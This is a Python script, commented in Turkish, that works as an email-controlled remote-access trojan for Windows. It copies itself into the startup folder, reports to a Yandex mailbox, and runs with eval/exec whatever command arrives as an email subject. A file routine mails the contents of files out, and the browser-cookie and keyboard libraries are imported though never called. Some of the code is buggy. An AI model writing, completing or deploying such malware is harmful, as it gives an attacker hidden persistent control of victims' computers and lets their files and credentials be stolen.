import imaplib
import email
import time
import pyautogui
import smtplib
from email.mime.text import MIMEText
global username,password
import winshell
import os
import sys
import keyboard
import requests
import browsercookie
startup = winshell.startup()
source_file = str(sys.argv[0])
source_file_2 = os.getcwd()+'/'+os.path.basename(__file__)
destination_file = startup+'/'+os.path.basename(__file__)
# Sistemin hızlanması için zaman zaman eposta kutusunu temizliyin

# https://mail.yandex.com/?dpda=yes&uid=1733239543#setup/client
username = "####@yandex.com"
#mail adresiniz
password = "#######"
def file(filename,kind,data):
  #Eğer dosya okumak istiyorsanız data kısmını boş bırakın
  if kind=="r" or kind=="rb":
    with open(filename, kind) as file:
      send_mail(username,filename,file.read())
  if kind=="w" or kind=="wb":
     with open(filename, kind) as file:
       file.write(data)
def send_mail(to, subject, body):


  # E-posta sunucusuna bağlanın
  mail = smtplib.SMTP("smtp.yandex.com",587)
  mail.ehlo()
  mail.starttls()
  mail.login(username, password)

  # E-posta mesajını oluşturun
  
  msg = email.message.EmailMessage()
  msg["To"] = to
  msg["Subject"] = subject
  msg["From"] = username
  msg.set_content(body)

    # E-postayı gönderin
  mail.send_message(msg)

  # Bağlantıyı kapatın
  mail.quit()
def read_mail():

    # Yukarıdaki linkteki tüm tikleri işaretleyin
    mail = imaplib.IMAP4_SSL("imap.yandex.com")
    mail.login(username, password)

    mail.select("INBOX")
    _, search_data = mail.search(None, "ALL")


    latest_email_index = search_data[0].split()[-1]

    _, msg_data = mail.fetch(latest_email_index, "(RFC822)")

    
    msg = email.message_from_bytes(msg_data[0][1])


    return msg["Subject"]
while 1:
  try:
    send_mail(username,"Connection","Succesful")
    break
  except:
    print("waiting ethernet")
    time.sleep(5)
try:
  if not os.path.exists(destination_file):
      # Dosya yoksa kopyala
      with open(source_file, 'r') as f:
          data = f.read()
      with open(destination_file, 'w') as f:
          f.write(data)

except Exception as e:
  error = e
  try:
    if not os.path.exists(destination_file_2):
        # Dosya yoksa kopyala
        with open(source_file_2, 'r') as f:
            data = f.read()
        with open(destination_file, 'w') as f:
            f.write(data)
  except Exception as e:
    error = e +"/n/n/n/n"+error
  try:
        send_mail(username,"failed to copy for startup","unknown /n"+error)
  except:
    print("Maybe connection failed")

while True :
  try:
    temp=read_mail()
  except Exception as e:
    error = e
    try:
      send_mail(username,"mail can`t be read",e)
    except Exception as e:
      print(e)
  if temp=="executed" or temp==None or temp=="Connection"or temp=="ERROR":
    pass
  else:
    try:
      eval(temp)
    except Exception as e:
      error=e
      try:
        exec(temp)
      except Exception as e:
        error = "exec!!!\n\n\n\n" + str(error)
        try:
          send_mail(username,"ERROR",error)
        except Exception as e:
          error=e+"!!/n/n/n/n"+str(error)
          print(error)
    send_mail(username,"executed",temp)
      
